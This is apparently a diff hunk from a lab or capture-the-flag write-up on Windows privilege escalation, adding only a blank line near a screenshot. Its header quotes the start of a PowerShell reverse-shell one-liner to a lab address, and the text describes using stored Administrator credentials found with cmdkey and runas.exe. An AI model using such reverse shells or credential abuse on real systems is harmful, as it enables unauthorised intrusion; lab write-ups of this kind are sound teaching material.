@@ -91,6 +91,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.XX.
 ```
 
 As I enumerated the machine for possible privilege escalation vectors, I took note of the fact that there seemed to be some group policy in play that was whitelisting apps and executables, making it more difficult to run enumeration tools from the Security user. Eventually, I ran the `cmdkey /list` command and found that there are stored Administrator credentials, something that can very easily escalate our privileges, often by using the `runas.exe` utility.
+
 <img width="426" height="148" alt="image" src="https://github.com/user-attachments/assets/ff19d106-439c-4cf6-9235-b0d803557641" />
 
 _Administrator credentials stored in the Windows Credential Manager_
